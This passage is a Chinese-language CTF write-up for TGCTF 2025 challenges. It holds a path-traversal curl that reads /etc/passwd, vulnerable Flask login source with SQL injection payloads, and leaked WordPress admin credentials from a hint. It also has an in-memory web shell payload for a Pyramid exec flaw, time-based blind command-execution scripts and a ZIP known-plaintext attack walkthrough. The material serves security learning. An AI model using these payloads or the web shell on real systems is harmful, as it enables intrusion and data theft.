href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问<span class="hljs-regexp">/@fs/</span>tmp<span class="hljs-regexp">/获得绝对路径/</span>app，同时给了附件看docker也能看出路径<br><br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58664</span>/<br>curl --request-target <span class="hljs-regexp">/@fs/</span>app<span class="hljs-regexp">/#/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/tgflagggg http:/</span><span class="hljs-regexp">/127.0.0.1:58664/</span><br></code></pre></td></tr></table></figure><hr><h2 id="TGCTF2025-后台管理"><a href="#TGCTF2025-后台管理" class="headerlink" title="TGCTF2025 后台管理"></a>TGCTF2025 后台管理</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, redirect, render_template,<br>render_template_string<br><span class="hljs-keyword">import</span> pymysql.cursors<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">return</span> pymysql.connect(<br>        host=os.environ[<span class="hljs-string">&quot;MYSQL_HOST&quot;</span>],<br>        user=os.environ[<span class="hljs-string">&quot;MYSQL_USER&quot;</span>],<br>        password=os.environ[<span class="hljs-string">&quot;MYSQL_PASSWORD&quot;</span>],<br>        database=os.environ[<span class="hljs-string">&quot;MYSQL_DATABASE&quot;</span>],<br>        charset=<span class="hljs-string">&quot;utf8mb4&quot;</span>,<br>        cursorclass=pymysql.cursors.DictCursor,<br>   )<br>   <br>app = Flask(name)<br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.cookies:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/login&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, username=request.cookies[<span class="hljs-string">&quot;username&quot;</span>])<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>可以在参数中使用 \ 来转义字符串从而绕开引号的限制，剩下的就很简单了。<br>    <span class="hljs-keyword">if</span> request.method  <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>        password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;要输入账号密码喔~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(username) &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(password) &gt; <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;哈~太长了，受不了了~&quot;</span>, <span class="hljs-number">400</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> username <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-keyword">in</span> password:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;杂鱼，还想SQL注入？爬！&quot;</span>, <span class="hljs-number">400</span><br>            <br>        conn = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">try</span>:<br>            conn = db()<br>            <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>                cursor.execute(<br>                    <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND</span><br><span class="hljs-string">password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>               )<br>                user = cursor.fetchone()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, <span class="hljs-number">500</span><br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-keyword">if</span> conn <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                conn.close()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> user:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;账号密码错误&quot;</span>, <span class="hljs-number">400</span><br>        response = redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>       response.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, user[<span class="hljs-string">&quot;username&quot;</span>])<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;login.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以在参数中使用 \ 来转义字符串从而绕开引号的限制然后使用报错注入。并且引号被过滤了，所以报错注入中的’~’可以改为null，就不需要单引号了。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">and</span> updatexml(<span class="hljs-keyword">null</span>,concat((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag)),<span class="hljs-keyword">null</span>)<span class="hljs-comment">--+</span><br><br>username=\&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> *,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> flag#<br></code></pre></td></tr></table></figure><hr><h2 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h2><p>Sample Page发现小记，可以知道前台有多个方向漏洞。 </p><p>这里我就写个MISC方向的漏洞</p><p><strong>logo另存为图片，jphide可以找到hint。</strong></p><p>hint内容：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+ HINT(not flag/FLAG):</span><br><span class="hljs-addition">+ username/password:</span><br><span class="hljs-addition">+ TG_wordpressor</span><br><span class="hljs-addition">+ aXx^oV@K&amp;cFoVaztQ*</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+ All hints have the same content</span><br><span class="hljs-addition">+ obtaining one is enough</span><br></code></pre></td></tr></table></figure><p>然后用账号密码登录，进入后台</p><p>发现插件有6.0的WP File Manager。漏洞号是CVE-2020-25213</p><p>然后根据题目的提示<code>flag形式是TGCTF&#123;CVE编号&#125;</code></p><p>所以flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TGCTF</span>&#123;CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">25213</span>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a><strong>熟悉的配方，熟悉的味道</strong></h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyramid.config <span class="hljs-keyword">import</span> Configurator<br><span class="hljs-keyword">from</span> pyramid.request <span class="hljs-keyword">import</span> Request<br><span class="hljs-keyword">from</span> pyramid.response <span class="hljs-keyword">import</span> Response<br><span class="hljs-keyword">from</span> pyramid.view <span class="hljs-keyword">import</span> view_config<br><span class="hljs-keyword">from</span> wsgiref.simple_server <span class="hljs-keyword">import</span> make_server<br><span class="hljs-keyword">from</span> pyramid.events <span class="hljs-keyword">import</span> NewResponse<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, BaseLoader<br><br>eval_globals = &#123; <span class="hljs-comment">#防止eval执行恶意代码</span><br>    <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="hljs-comment"># 禁用所有内置函数</span><br>    <span class="hljs-string">&#x27;__import__&#x27;</span>: <span class="hljs-literal">None</span>       <span class="hljs-comment"># 禁止动态导入</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr_input</span>):<br>    expr = re.split(<span class="hljs-string">r&quot;[-+*/]&quot;</span>, expr_input)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">exec</span>(expr_input))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(expr) != <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">int</span>(expr[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home_view</span>(<span class="hljs-params">request</span>):<br>    expr_input = <span class="hljs-string">&quot;&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        expr_input = request.POST[<span class="hljs-string">&#x27;expr&#x27;</span>]<br>        <span class="hljs-keyword">if</span> checkExpr(expr_input):<br>            <span class="hljs-keyword">try</span>:<br>                result = <span class="hljs-built_in">eval</span>(expr_input, eval_globals)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                result = e<br>        <span class="hljs-keyword">else</span>:<br>            result = <span class="hljs-string">&quot;爬！&quot;</span><br><br><br>    template_str = 【xxx】<br><br>    env = Environment(loader=BaseLoader())<br>    template = env.from_string(template_str)<br>    rendered = template.render(expr_input=expr_input, result=result)<br>    <span class="hljs-keyword">return</span> Response(rendered)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> Configurator() <span class="hljs-keyword">as</span> config:<br>        config.add_route(<span class="hljs-string">&#x27;home_view&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>        config.add_view(home_view, route_name=<span class="hljs-string">&#x27;home_view&#x27;</span>)<br>        app = config.make_wsgi_app()<br><br>    server = make_server(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9040</span>, app)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>比赛时候想到了要利用exec无回显命令执行，但是不知道怎么利用。题解说是打内存马</p><p>三种解法：</p><p>payload：</p><p>1、内存马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">expr</span>=exec(&quot;config.add_route(&#x27;shell_route&#x27;,&#x27;/17shell&#x27;);config.add_view(lambda<br>request:Response(import(<span class="hljs-string">&#x27;os&#x27;</span>).popen(request.params.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;1&#x27;</span>)).read()),route<br><span class="hljs-attribute">_name</span>=<span class="hljs-string">&#x27;shell_route&#x27;</span>);app = config.make_wsgi_app()<span class="hljs-string">&quot;)</span><br><span class="hljs-string">/17shell?1=ls /</span><br></code></pre></td></tr></table></figure><p><strong>对内存马进行分析：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br>这行代码导入了Python的标准库模块sys，用于访问与Python解释器紧密相关的变量和函数。<br><br>config = sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.config</span><br>这当前运行环境中存在名为config的对象，并且它是全局命名空间的一部分（即位于__main__模块中）。config对象通常用于存储应用程序配置信息，在Pyramid框架中，它还负责定义应用的行为，如路由规则等。<br>app = sys<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.app</span><br><br>类似地，app也被认为是在全局命名空间中存在的一个变量，代表了WSGI兼容的应用实例。<span class="hljs-built_in">WSGI</span>(Web Server Gateway Interface)是一种用于Python web应用和服务之间通信的标准接口。<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(config)</span></span><br>这行代码简单地打印出config对象的内容，为了更好调试，检查其是否正确加载。<br><br>config<span class="hljs-selector-class">.add_route</span>(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;/shell&#x27;</span>)<br>此行调用了config对象的方法add_route，用于向Web应用添加一个新的URL路由。这里的路由名称为<span class="hljs-string">&#x27;shell&#x27;</span>，对应的路径是<span class="hljs-string">&#x27;/shell&#x27;</span>。这意味着当用户访问这个特定的URL时，会触发与之关联的视图逻辑。<br><br>config<span class="hljs-selector-class">.add_view</span>(lambda request: <span class="hljs-built_in">Response</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(request<span class="hljs-selector-class">.params</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;1&#x27;</span>))<span class="hljs-selector-class">.read</span>()), route_name=<span class="hljs-string">&#x27;shell&#x27;</span>)<br>这是关键的一行，它定义了一个匿名函数（lambda表达式），该函数接受一个request参数并返回一个HTTP响应。在这个过程中，它使用了<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(...)来执行操作系统命令。更具体地说，它从请求参数中获取键为<span class="hljs-string">&#x27;1&#x27;</span>的值，并将其作为命令传递给系统shell执行。然后，它读取命令执行的结果，并通过Response对象将其作为HTTP响应体发送回客户端。<br><br>app = config<span class="hljs-selector-class">.make_wsgi_app</span>()<br>最后，这行代码调用了config上的make_wsgi_app方法，创建了一个新的WSGI应用实例，并将其赋值给app变量。这一步骤完成了应用的构建过程。<br></code></pre></td></tr></table></figure><p>2、request.add_response_callback 钩子函数进行回显。（是个好方法，但是这里用 不了，因为exec不在home_view下没有request）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">print</span>(<span class="hljs-built_in">exec</span>(&quot;request.<span class="hljs-built_in">add_response_callback</span>(lambda request,<br><span class="hljs-attribute">response</span>:<span class="hljs-built_in">setattr</span>(response, <span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">import</span>(<span class="hljs-string">&#x27;os&#x27;</span>),<span class="hljs-string">&#x27;popen&#x27;</span>)<br>(<span class="hljs-string">&#x27;whoami&#x27;</span>),<span class="hljs-string">&#x27;read&#x27;</span>)()))&quot;));<br></code></pre></td></tr></table></figure><p>3、时间盲注：（唯一能看懂的方法）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">import <span class="hljs-built_in">string</span><br>import requests<br>import time<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:59439/&quot;</span><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> strr in <span class="hljs-built_in">string</span>.printable:<br>        <span class="hljs-keyword">shell</span> = <span class="hljs-keyword">f</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>import os<br>import time<br><span class="hljs-keyword">a</span> = os.popen(<span class="hljs-string">&#x27;cat /fl*&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">a</span>) &gt; &#123;i&#125; <span class="hljs-built_in">and</span> <span class="hljs-keyword">a</span>[&#123;i&#125;] == <span class="hljs-string">&#x27;&#123;strr&#125;&#x27;</span>:<br>time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">&quot;</span><br>        start = time.time()<br>        requests.post(url, data=&#123;<span class="hljs-string">&#x27;expr&#x27;</span>: <span class="hljs-keyword">shell</span>&#125;)<br>        end = time.time()<br>        <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">2</span>:<br>            ans += strr<br>            <span class="hljs-keyword">print</span>(ans)<br></code></pre></td></tr></table></figure><p>另一个脚本（这个更稳定，也更难看懂）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim">import requests<br>import time<br><br>def cmd(cmd):<br>    url = <span class="hljs-string">&quot;http://node1.tgctf.woooo.tech:32142/&quot;</span><br>    # url = <span class="hljs-string">&quot;http://127.0.0.1:9040/&quot;</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        flag = True<br>        <span class="hljs-keyword">left</span> = <span class="hljs-number">33</span><br>        <span class="hljs-keyword">right</span> = <span class="hljs-number">126</span><br><br>        <span class="hljs-keyword">while</span> True:<br>            data = &#123;<br>                <span class="hljs-string">&quot;expr&quot;</span>: <span class="hljs-keyword">f</span><span class="hljs-string">&#x27;a=__import__(&quot;os&quot;).popen(&quot;&#123;cmd&#125;&quot;).read()\nif(ord(a[&#123;i&#125;])&lt;&#123;(left+right)//2&#125;):__import__(&quot;time&quot;).sleep(1)&#x27;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> flag:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>                except Exception <span class="hljs-keyword">as</span> err:<br>                    pass<br>                # <span class="hljs-keyword">print</span>(<span class="hljs-keyword">res</span>.text)<br>                flag = False<br><br>            start = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">res</span> = requests.post(url, data=data)<br>            except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-keyword">e</span>)<br>                i -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">continue</span><br><br>            end = time.time()<br>            <span class="hljs-keyword">print</span>(<span class="hljs-keyword">left</span>, <span class="hljs-keyword">right</span>, (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>, end-start)<br>            <br>            <span class="hljs-keyword">if</span> end - start &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">right</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">left</span> = (<span class="hljs-keyword">left</span>+<span class="hljs-keyword">right</span>)//<span class="hljs-number">2</span>+<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">left</span> &gt; <span class="hljs-keyword">right</span>:<br>                # <span class="hljs-keyword">print</span>(chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>), end=<span class="hljs-string">&quot;&quot;</span>)<br>                result += chr(<span class="hljs-keyword">left</span>-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">print</span>(result)<br>                <span class="hljs-keyword">break</span><br><br><br>cmd(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br></code></pre></td></tr></table></figure><hr><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h2><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</p><hr><p>先把Victory_is_at_hand.zip下载下来，然发现要密码，爆破一下</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-3.png"></p><p>爆出密码20250412，将压缩包解压。</p><p>第二步得到一个end压缩包和sh512.txt的文件，再看一看压缩包内，同样有一个相同名字的文件，优先考虑明文爆破，但是明文爆破是需要有已知明文的，这里我们发现sh512内的并非密文而是有意义的明文</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">Awesome,</span>you_are_so_good<br></code></pre></td></tr></table></figure><p>自然可以想到把内容进行sha512加密：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0894</span>fb<span class="hljs-number">7</span>edcf<span class="hljs-number">85585e8749</span>faeac<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>adf<span class="hljs-number">4247</span>ae<span class="hljs-number">49</span>b<span class="hljs-number">50</span><span class="hljs-keyword">cc</span><span class="hljs-number">55</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>dd<span class="hljs-number">5</span>eead<span class="hljs-number">0</span>a<span class="hljs-number">9</span>be<span class="hljs-number">60</span>b<span class="hljs-number">7</span>d<span class="hljs-number">848</span>baece<span class="hljs-number">2</span>ee<span class="hljs-number">65273</span>d<span class="hljs-number">110317</span>be<span class="hljs-number">4</span>fe<span class="hljs-number">709</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">2</span>bdeab<span class="hljs-number">48</span>a<span class="hljs-number">212</span>ca<span class="hljs-number">741e989</span>df<span class="hljs-number">39963</span><br></code></pre></td></tr></table></figure><p>把加密内容写进文本文件后打包，当然压缩方式也需要和原始的压缩方式一致</p><p>对照一下crc值：</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-4.png"></p><p>使用ARCHPR明文攻击</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-5.png"></p><p>得到解密之后的文件。</p><p>解压得到一个flag压缩包，但是flag压缩包解压出错</p><p>观察一下，发现文件名的长度有问题，修改一下，flag.txt长度应为8,改回08 00</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-6.png"></p><p>010中没有没有看到明文flag，但是压缩算法却为store，这里修改为DEFLATE</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-7.png"></p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-8.png"></p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-9.png"></p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-10.png"></p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-11.png"></p><p>其余的部分,<strong>压缩源文件数据区</strong>和<strong>压缩源文件目录区</strong>在文件头标记后,除了压缩源文件目录区</p><p>多出一条压缩使用的版本 (2 bytes) ,即本题中重复出现的两次14 00,一直到文件名长度</p><p>08 